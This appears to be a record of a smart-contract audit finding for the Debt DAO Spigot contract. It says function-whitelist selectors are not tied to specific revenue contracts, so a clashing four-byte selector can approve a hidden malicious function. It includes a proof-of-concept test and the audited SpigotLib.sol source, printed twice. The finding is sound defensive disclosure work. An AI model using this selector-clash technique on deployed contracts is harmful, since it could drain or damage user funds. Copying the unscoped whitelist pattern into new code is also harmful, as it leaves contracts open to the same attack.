{
  "Title": "[M-07] Whitelisted functions arenâ€™t scoped to revenue contracts and may lead to unnoticed calls due to selector clashing",
  "Content": "# Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14\n\n\n# Vulnerability details\n\nWhitelisted functions in the Spigot contract don't have any kind of association or validation to which revenue contract they are intended to be used. This may lead to inadvertently whitelisting a function in another revenue contract that has the same selector but a different name (signature).\n\n## Impact\n\nFunctions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not difficult) to find different functions that have the same selector.\n\nIn this way, a bad actor can try to use an innocent looking function that matches the selector of another function (in a second revenue contract) that has malicious intentions. The arbiter will review the innocent function, whitelist its selector, while unknowingly enabling a potential call to the malicious function, since whitelisted functions can be called on any revenue contract. \n\nMining for selector clashing is feasible since selectors are 4 bytes and the search space isn't that big for current hardware.\n\nThis is similar to the attack found on proxies, documented here https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357 and here https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070\n\n## PoC\n\nIn the following test the `collate_propagate_storage(bytes16)` function is whitelisted because it looks safe enough to the arbiter. Now, `collate_propagate_storage(bytes16) ` has the same selector as `burn(uint256)`, which allows a bad actor to call `EvilRevenueContract.burn` using the `operate` function of the Spigot.\n\nNote: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.\n\n```\ncontract InnocentRevenueContract {\n    function collate_propagate_storage(bytes16) external {\n        // It's all safe here!\n        console.log(\"Hey it's all good here\");\n    }\n}\n\ncontract EvilRevenueContract {\n    function burn(uint256) external {\n        // Burn the world!\n        console.log(\"Boom!\");\n    }\n}\n\nfunction test_WhitelistFunction_SelectorClash() public {\n      vm.startPrank(owner);\n      \n      spigot = new Spigot(owner, treasury, operator);\n      \n      // Arbiter looks at InnocentRevenueContract.collate_propagate_storage and thinks it's safe to whitelist it (this is a simplified version, in a real deploy this comes from the SpigotedLine contract)\n      spigot.updateWhitelistedFunction(InnocentRevenueContract.collate_propagate_storage.selector, true);\n      assertTrue(spigot.isWhitelisted(InnocentRevenueContract.collate_propagate_storage.selector));\n      \n      // Due to selector clashing EvilRevenueContract.burn gets whitelisted too!\n      assertTrue(spigot.isWhitelisted(EvilRevenueContract.burn.selector));\n      \n      \n      EvilRevenueContract evil = new EvilRevenueContract();\n      // ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);\n      // require(spigot.addSpigot(address(evil), settings), \"Failed to add spigot\");\n      \n      vm.stopPrank();\n              \n      // And we can call it through operate...\n      vm.startPrank(operator);\n      spigot.operate(address(evil), abi.encodeWithSelector(EvilRevenueContract.burn.selector, type(uint256).max));\n  }\n```\n\n## Recommendation\n\nAssociate whitelisted functions to particular revenue contracts (for example, using a `mapping(address => mapping(bytes4 => bool))`) and validate that the selector for the call is enabled for that specific revenue contract in the `operate` function. \n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-11-debt-dao-contest",
  "Code": [
    {
      "filename": "code4rena-2022-11-03/contracts/utils/SpigotLib.sol",
      "content": "pragma solidity 0.8.9;\n\nimport { ReentrancyGuard } from \"openzeppelin/security/ReentrancyGuard.sol\";\nimport {LineLib} from \"../utils/LineLib.sol\";\nimport {ISpigot} from \"../interfaces/ISpigot.sol\";\n\nstruct SpigotState {\n    address owner;\n    address operator;\n    address treasury;\n    // Total amount of revenue tokens escrowed by the Spigot and available to be claimed\n    mapping(address => uint256) escrowed; // token  -> amount escrowed\n    // Functions that the operator is allowed to run on all revenue contracts controlled by the Spigot\n    mapping(bytes4 => bool) whitelistedFunctions; // function -> allowed\n    // Configurations for revenue contracts related to the split of revenue, access control to claiming revenue tokens and transfer of Spigot ownership\n    mapping(address => ISpigot.Setting) settings; // revenue contract -> settings\n}\n\n/**\n * @notice - helper lib for Spigot\n * @dev see Spigot docs\n */\nlibrary SpigotLib {\n    // Maximum numerator for Setting.ownerSplit param to ensure that the Owner can't claim more than 100% of revenue\n    uint8 constant MAX_SPLIT = 100;\n    // cap revenue per claim to avoid overflows on multiplication when calculating percentages\n    uint256 constant MAX_REVENUE = type(uint256).max / MAX_SPLIT;\n\n    function _claimRevenue(SpigotState storage self, address revenueContract, address token, bytes calldata data)\n        public\n        returns (uint256 claimed)\n    {\n        uint256 existingBalance = LineLib.getBalance(token);\n        if(self.settings[revenueContract].claimFunction == bytes4(0)) {\n            // push payments\n\n            // claimed = total balance - already accounted for balance\n            claimed = existingBalance - self.escrowed[token];\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        } else {\n            // pull payments\n            if(bytes4(data) != self.settings[revenueContract].claimFunction) { revert BadFunction(); }\n            (bool claimSuccess,) = revenueContract.call(data);\n            if(!claimSuccess) { revert ClaimFailed(); }\n\n            // claimed = total balance - existing balance\n            claimed = LineLib.getBalance(token) - existingBalance;\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        }\n\n        if(claimed == 0) { revert NoRevenue(); }\n\n        // cap so uint doesnt overflow in split calculations.\n        // can sweep by \"attaching\" a push payment spigot with same token\n        if(claimed > MAX_REVENUE) claimed = MAX_REVENUE;\n\n        return claimed;\n    }\n\n    /** see Spigot.operate */\n    function operate(SpigotState storage self, address revenueContract, bytes calldata data) external returns (bool) {\n        if(msg.sender != self.operator) { revert CallerAccessDenied(); }\n        \n        // extract function signature from tx data and check whitelist\n        bytes4 func = bytes4(data);\n\n        if(!self.whitelistedFunctions[func]) { revert BadFunction(); }\n        \n        // cant claim revenue via operate() because that fucks up accounting logic. Owner shouldn't whitelist it anyway but just in case\n        // also can't transfer ownership so Owner retains control of revenue contract\n        if(\n          func == self.settings[revenueContract].claimFunction ||\n          func == self.settings[revenueContract].transferOwnerFunction\n        ) { revert BadFunction(); }\n\n        (bool success,) = revenueContract.call(data);\n        if(!success) { revert BadFunction(); }\n\n        return true;\n    }\n\n    /** see Spigot.claimRevenue */\n    function claimRevenue(SpigotState storage self, address revenueContract, address token, bytes calldata data)\n        external\n        returns (uint256 claimed)\n    {\n        claimed = _claimRevenue(self, revenueContract, token, data);\n\n        // splits revenue stream according to Spigot settings\n        uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n        // update escrowed balance\n        self.escrowed[token] = self.escrowed[token] + escrowedAmount;\n        \n        // send non-escrowed tokens to Treasury if non-zero\n        if(claimed > escrowedAmount) {\n            require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n        }\n\n        emit ClaimRevenue(token, claimed, escrowedAmount, revenueContract);\n        \n        return claimed;\n    }\n\n    /** see Spigot.claimEscrow */\n    function claimEscrow(SpigotState storage self, address token)\n        external\n        returns (uint256 claimed) \n    {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n        \n        claimed = self.escrowed[token];\n\n        if(claimed == 0) { revert ClaimFailed(); }\n\n        LineLib.sendOutTokenOrETH(token, self.owner, claimed);\n\n        self.escrowed[token] = 0; // keep 1 in escrow for recurring call gas optimizations?\n\n        emit ClaimEscrow(token, claimed, self.owner);\n\n        return claimed;\n    }\n\n    /** see Spigot.addSpigot */\n    function addSpigot(SpigotState storage self, address revenueContract, ISpigot.Setting memory setting) external returns (bool) {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n\n        require(revenueContract != address(this));\n        // spigot setting already exists\n        require(self.settings[revenueContract].transferOwnerFunction == bytes4(0));\n        \n        // must set transfer func\n        if(setting.transferOwnerFunction == bytes4(0)) { revert BadSetting(); }\n        if(setting.ownerSplit > MAX_SPLIT) { revert BadSetting(); }\n        \n        self.settings[revenueContract] = setting;\n        emit AddSpigot(revenueContract, setting.ownerSplit);\n\n        return true;\n    }\n\n    /** see Spigot.removeSpigot */\n    function removeSpigot(SpigotState storage self, address revenueContract)\n        external\n        returns (bool)\n    {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n\n        (bool success,) = revenueContract.call(\n            abi.encodeWithSelector(\n                self.settings[revenueContract].transferOwnerFunction,\n                self.operator    // assume function only takes one param that is new owner address\n            )\n        );\n        require(success);\n\n        delete self.settings[revenueContract];\n        emit RemoveSpigot(revenueContract);\n\n        return true;\n    }\n\n    /** see Spigot.updateOwnerSplit */\n    function updateOwnerSplit(SpigotState storage self, address revenueContract, uint8 ownerSplit)\n        external\n        returns(bool)\n    {\n      if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n      if(ownerSplit > MAX_SPLIT) { revert BadSetting(); }\n\n      self.settings[revenueContract].ownerSplit = ownerSplit;\n      emit UpdateOwnerSplit(revenueContract, ownerSplit);\n      \n      return true;\n    }\n\n    /** see Spigot.updateOwner */\n    function updateOwner(SpigotState storage self, address newOwner) external returns (bool) {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n        require(newOwner != address(0));\n        self.owner = newOwner;\n        emit UpdateOwner(newOwner);\n        return true;\n    }\n\n    /** see Spigot.updateOperator */\n    function updateOperator(SpigotState storage self, address newOperator) external returns (bool) {\n        if(msg.sender != self.operator) { revert CallerAccessDenied(); }\n        require(newOperator != address(0));\n        self.operator = newOperator;\n        emit UpdateOperator(newOperator);\n        return true;\n    }\n\n    /** see Spigot.updateTreasury */\n    function updateTreasury(SpigotState storage self, address newTreasury) external returns (bool) {\n        if(msg.sender != self.operator && msg.sender != self.treasury) {\n          revert CallerAccessDenied();\n        }\n\n        require(newTreasury != address(0));\n        self.treasury = newTreasury;\n        emit UpdateTreasury(newTreasury);\n        return true;\n    }\n\n    /** see Spigot.updateWhitelistedFunction*/\n    function updateWhitelistedFunction(SpigotState storage self, bytes4 func, bool allowed) external returns (bool) {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n        self.whitelistedFunctions[func] = allowed;\n        emit UpdateWhitelistFunction(func, allowed);\n        return true;\n    }\n\n    /** see Spigot.getEscrowed*/\n    function getEscrowed(SpigotState storage self, address token) external view returns (uint256) {\n        return self.escrowed[token];\n    }\n\n    /** see Spigot.isWhitelisted*/\n    function isWhitelisted(SpigotState storage self, bytes4 func) external view returns(bool) {\n      return self.whitelistedFunctions[func];\n    }\n\n \n    /** see Spigot.getSetting*/\n    function getSetting(SpigotState storage self, address revenueContract)\n        external view\n        returns(uint8, bytes4, bytes4)\n    {\n        return (\n            self.settings[revenueContract].ownerSplit,\n            self.settings[revenueContract].claimFunction,\n            self.settings[revenueContract].transferOwnerFunction\n        );\n    }\n\n\n    // Spigot Events\n\n    event AddSpigot(\n        address indexed revenueContract,\n        uint256 ownerSplit\n    );\n\n    event RemoveSpigot(address indexed revenueContract);\n\n    event UpdateWhitelistFunction(bytes4 indexed func, bool indexed allowed);\n\n    event UpdateOwnerSplit(\n        address indexed revenueContract,\n        uint8 indexed split\n    );\n\n    event ClaimRevenue(\n        address indexed token,\n        uint256 indexed amount,\n        uint256 escrowed,\n        address revenueContract\n    );\n\n    event ClaimEscrow(\n        address indexed token,\n        uint256 indexed amount,\n        address owner\n    );\n\n    // Stakeholder Events\n\n    event UpdateOwner(address indexed newOwner);\n\n    event UpdateOperator(address indexed newOperator);\n\n    event UpdateTreasury(address indexed newTreasury);\n\n    \n    // Errors\n\n    error BadFunction();\n\n    error ClaimFailed();\n\n    error NoRevenue();\n\n    error UnclaimedRevenue();\n\n    error CallerAccessDenied();\n\n    error BadSetting();\n}"
    },
    {
      "filename": "code4rena-2022-11-03/contracts/utils/SpigotLib.sol",
      "content": "pragma solidity 0.8.9;\n\nimport { ReentrancyGuard } from \"openzeppelin/security/ReentrancyGuard.sol\";\nimport {LineLib} from \"../utils/LineLib.sol\";\nimport {ISpigot} from \"../interfaces/ISpigot.sol\";\n\nstruct SpigotState {\n    address owner;\n    address operator;\n    address treasury;\n    // Total amount of revenue tokens escrowed by the Spigot and available to be claimed\n    mapping(address => uint256) escrowed; // token  -> amount escrowed\n    // Functions that the operator is allowed to run on all revenue contracts controlled by the Spigot\n    mapping(bytes4 => bool) whitelistedFunctions; // function -> allowed\n    // Configurations for revenue contracts related to the split of revenue, access control to claiming revenue tokens and transfer of Spigot ownership\n    mapping(address => ISpigot.Setting) settings; // revenue contract -> settings\n}\n\n/**\n * @notice - helper lib for Spigot\n * @dev see Spigot docs\n */\nlibrary SpigotLib {\n    // Maximum numerator for Setting.ownerSplit param to ensure that the Owner can't claim more than 100% of revenue\n    uint8 constant MAX_SPLIT = 100;\n    // cap revenue per claim to avoid overflows on multiplication when calculating percentages\n    uint256 constant MAX_REVENUE = type(uint256).max / MAX_SPLIT;\n\n    function _claimRevenue(SpigotState storage self, address revenueContract, address token, bytes calldata data)\n        public\n        returns (uint256 claimed)\n    {\n        uint256 existingBalance = LineLib.getBalance(token);\n        if(self.settings[revenueContract].claimFunction == bytes4(0)) {\n            // push payments\n\n            // claimed = total balance - already accounted for balance\n            claimed = existingBalance - self.escrowed[token];\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        } else {\n            // pull payments\n            if(bytes4(data) != self.settings[revenueContract].claimFunction) { revert BadFunction(); }\n            (bool claimSuccess,) = revenueContract.call(data);\n            if(!claimSuccess) { revert ClaimFailed(); }\n\n            // claimed = total balance - existing balance\n            claimed = LineLib.getBalance(token) - existingBalance;\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        }\n\n        if(claimed == 0) { revert NoRevenue(); }\n\n        // cap so uint doesnt overflow in split calculations.\n        // can sweep by \"attaching\" a push payment spigot with same token\n        if(claimed > MAX_REVENUE) claimed = MAX_REVENUE;\n\n        return claimed;\n    }\n\n    /** see Spigot.operate */\n    function operate(SpigotState storage self, address revenueContract, bytes calldata data) external returns (bool) {\n        if(msg.sender != self.operator) { revert CallerAccessDenied(); }\n        \n        // extract function signature from tx data and check whitelist\n        bytes4 func = bytes4(data);\n\n        if(!self.whitelistedFunctions[func]) { revert BadFunction(); }\n        \n        // cant claim revenue via operate() because that fucks up accounting logic. Owner shouldn't whitelist it anyway but just in case\n        // also can't transfer ownership so Owner retains control of revenue contract\n        if(\n          func == self.settings[revenueContract].claimFunction ||\n          func == self.settings[revenueContract].transferOwnerFunction\n        ) { revert BadFunction(); }\n\n        (bool success,) = revenueContract.call(data);\n        if(!success) { revert BadFunction(); }\n\n        return true;\n    }\n\n    /** see Spigot.claimRevenue */\n    function claimRevenue(SpigotState storage self, address revenueContract, address token, bytes calldata data)\n        external\n        returns (uint256 claimed)\n    {\n        claimed = _claimRevenue(self, revenueContract, token, data);\n\n        // splits revenue stream according to Spigot settings\n        uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n        // update escrowed balance\n        self.escrowed[token] = self.escrowed[token] + escrowedAmount;\n        \n        // send non-escrowed tokens to Treasury if non-zero\n        if(claimed > escrowedAmount) {\n            require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n        }\n\n        emit ClaimRevenue(token, claimed, escrowedAmount, revenueContract);\n        \n        return claimed;\n    }\n\n    /** see Spigot.claimEscrow */\n    function claimEscrow(SpigotState storage self, address token)\n        external\n        returns (uint256 claimed) \n    {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n        \n        claimed = self.escrowed[token];\n\n        if(claimed == 0) { revert ClaimFailed(); }\n\n        LineLib.sendOutTokenOrETH(token, self.owner, claimed);\n\n        self.escrowed[token] = 0; // keep 1 in escrow for recurring call gas optimizations?\n\n        emit ClaimEscrow(token, claimed, self.owner);\n\n        return claimed;\n    }\n\n    /** see Spigot.addSpigot */\n    function addSpigot(SpigotState storage self, address revenueContract, ISpigot.Setting memory setting) external returns (bool) {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n\n        require(revenueContract != address(this));\n        // spigot setting already exists\n        require(self.settings[revenueContract].transferOwnerFunction == bytes4(0));\n        \n        // must set transfer func\n        if(setting.transferOwnerFunction == bytes4(0)) { revert BadSetting(); }\n        if(setting.ownerSplit > MAX_SPLIT) { revert BadSetting(); }\n        \n        self.settings[revenueContract] = setting;\n        emit AddSpigot(revenueContract, setting.ownerSplit);\n\n        return true;\n    }\n\n    /** see Spigot.removeSpigot */\n    function removeSpigot(SpigotState storage self, address revenueContract)\n        external\n        returns (bool)\n    {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n\n        (bool success,) = revenueContract.call(\n            abi.encodeWithSelector(\n                self.settings[revenueContract].transferOwnerFunction,\n                self.operator    // assume function only takes one param that is new owner address\n            )\n        );\n        require(success);\n\n        delete self.settings[revenueContract];\n        emit RemoveSpigot(revenueContract);\n\n        return true;\n    }\n\n    /** see Spigot.updateOwnerSplit */\n    function updateOwnerSplit(SpigotState storage self, address revenueContract, uint8 ownerSplit)\n        external\n        returns(bool)\n    {\n      if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n      if(ownerSplit > MAX_SPLIT) { revert BadSetting(); }\n\n      self.settings[revenueContract].ownerSplit = ownerSplit;\n      emit UpdateOwnerSplit(revenueContract, ownerSplit);\n      \n      return true;\n    }\n\n    /** see Spigot.updateOwner */\n    function updateOwner(SpigotState storage self, address newOwner) external returns (bool) {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n        require(newOwner != address(0));\n        self.owner = newOwner;\n        emit UpdateOwner(newOwner);\n        return true;\n    }\n\n    /** see Spigot.updateOperator */\n    function updateOperator(SpigotState storage self, address newOperator) external returns (bool) {\n        if(msg.sender != self.operator) { revert CallerAccessDenied(); }\n        require(newOperator != address(0));\n        self.operator = newOperator;\n        emit UpdateOperator(newOperator);\n        return true;\n    }\n\n    /** see Spigot.updateTreasury */\n    function updateTreasury(SpigotState storage self, address newTreasury) external returns (bool) {\n        if(msg.sender != self.operator && msg.sender != self.treasury) {\n          revert CallerAccessDenied();\n        }\n\n        require(newTreasury != address(0));\n        self.treasury = newTreasury;\n        emit UpdateTreasury(newTreasury);\n        return true;\n    }\n\n    /** see Spigot.updateWhitelistedFunction*/\n    function updateWhitelistedFunction(SpigotState storage self, bytes4 func, bool allowed) external returns (bool) {\n        if(msg.sender != self.owner) { revert CallerAccessDenied(); }\n        self.whitelistedFunctions[func] = allowed;\n        emit UpdateWhitelistFunction(func, allowed);\n        return true;\n    }\n\n    /** see Spigot.getEscrowed*/\n    function getEscrowed(SpigotState storage self, address token) external view returns (uint256) {\n        return self.escrowed[token];\n    }\n\n    /** see Spigot.isWhitelisted*/\n    function isWhitelisted(SpigotState storage self, bytes4 func) external view returns(bool) {\n      return self.whitelistedFunctions[func];\n    }\n\n \n    /** see Spigot.getSetting*/\n    function getSetting(SpigotState storage self, address revenueContract)\n        external view\n        returns(uint8, bytes4, bytes4)\n    {\n        return (\n            self.settings[revenueContract].ownerSplit,\n            self.settings[revenueContract].claimFunction,\n            self.settings[revenueContract].transferOwnerFunction\n        );\n    }\n\n\n    // Spigot Events\n\n    event AddSpigot(\n        address indexed revenueContract,\n        uint256 ownerSplit\n    );\n\n    event RemoveSpigot(address indexed revenueContract);\n\n    event UpdateWhitelistFunction(bytes4 indexed func, bool indexed allowed);\n\n    event UpdateOwnerSplit(\n        address indexed revenueContract,\n        uint8 indexed split\n    );\n\n    event ClaimRevenue(\n        address indexed token,\n        uint256 indexed amount,\n        uint256 escrowed,\n        address revenueContract\n    );\n\n    event ClaimEscrow(\n        address indexed token,\n        uint256 indexed amount,\n        address owner\n    );\n\n    // Stakeholder Events\n\n    event UpdateOwner(address indexed newOwner);\n\n    event UpdateOperator(address indexed newOperator);\n\n    event UpdateTreasury(address indexed newTreasury);\n\n    \n    // Errors\n\n    error BadFunction();\n\n    error ClaimFailed();\n\n    error NoRevenue();\n\n    error UnclaimedRevenue();\n\n    error CallerAccessDenied();\n\n    error BadSetting();\n}"
    }
  ]
}